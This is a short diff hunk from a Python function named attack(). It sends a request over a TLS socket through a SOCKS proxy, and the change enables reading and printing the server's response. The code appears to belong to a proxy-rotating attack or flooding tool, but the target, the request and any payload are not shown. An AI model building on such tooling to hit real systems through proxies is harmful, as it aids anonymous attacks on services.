@@ -273,13 +273,13 @@ def attack():
         ssock.sendall(request)
         #print(f"[DEBUG] Request sent")
 
-        #response = b''
-        #while True:
-        #    chunk = ssock.recv(4096)
-        #    if not chunk:
-        #        break
-        #    response += chunk
-        #print(response.decode())
+        response = b''
+        while True:
+            chunk = ssock.recv(4096)
+            if not chunk:
+                break
+            response += chunk
+        print(response.decode())
     except socks.ProxyConnectionError as proxy_error:
         print(f"[PROXY ERROR] {proxy['ip']}:{proxy['port']} - {proxy_error}")
     except ssl.SSLError as ssl_error:
